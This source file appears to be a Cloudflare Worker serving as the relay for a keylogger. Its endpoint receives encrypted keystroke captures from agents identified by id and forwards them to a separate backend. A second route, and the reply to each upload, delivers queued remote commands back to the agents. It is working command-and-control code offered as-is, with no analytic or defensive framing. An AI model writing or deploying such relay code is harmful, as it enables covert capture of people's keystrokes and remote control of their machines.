const API_KEY = 'REPLACE_WITH_API_KEY';
const BACKEND_URL = 'REPLACE_WITH_RENDER_URL';

export default {
  async fetch(request) {
    const url = new URL(request.url);
    const path = url.pathname;

    if (request.method === 'POST' && path === '/api/v1/keystrokes') {
      return handleKeystrokes(request);
    }

    if (request.method === 'GET' && path === '/api/v1/agent/commands') {
      return handleCommands(request, url);
    }

    if (request.method === 'GET' && path === '/health') {
      return new Response('OK', { status: 200 });
    }

    return new Response('Not Found', { status: 404 });
  }
}

async function handleKeystrokes(request) {
  const authHeader = request.headers.get('Authorization');
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return new Response('Unauthorized', { status: 401 });
  }

  const key = authHeader.substring(7);
  if (key !== API_KEY) {
    return new Response('Forbidden', { status: 403 });
  }

  const body = await request.json();
  if (!body.encrypted || !body.id || !body.ts) {
    return new Response('Bad Request', { status: 400 });
  }

  const normalized = { encrypted: body.encrypted, id: body.id, ts: body.ts };

  const backendRes = await fetch(BACKEND_URL + '/api/v1/agent/data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(normalized),
  });

  if (!backendRes.ok) {
    return new Response('Backend Error', { status: 502 });
  }

  const cmdRes = await fetch(BACKEND_URL + '/api/v1/agent/commands?id=' + body.id, {
    method: 'GET',
    headers: { 'Content-Type': 'application/json' },
  });

  if (cmdRes.ok) {
    const cmd = await cmdRes.json();
    if (cmd.command) {
      return new Response(JSON.stringify(cmd), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      });
    }
  }

  return new Response(JSON.stringify({}), { status: 200 });
}

async function handleCommands(request, url) {
  const authHeader = request.headers.get('Authorization');
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return new Response('Unauthorized', { status: 401 });
  }
  const key = authHeader.substring(7);
  if (key !== API_KEY) {
    return new Response('Forbidden', { status: 403 });
  }

  const agentId = url.searchParams.get('id') || '';
  const backendRes = await fetch(BACKEND_URL + '/api/v1/agent/commands?id=' + agentId, {
    method: 'GET',
    headers: { 'Content-Type': 'application/json' },
  });

  if (!backendRes.ok) {
    return new Response('Backend Error', { status: 502 });
  }
  const data = await backendRes.json();
  return new Response(JSON.stringify(data), {
    status: 200,
    headers: { 'Content-Type': 'application/json' },
  });
}
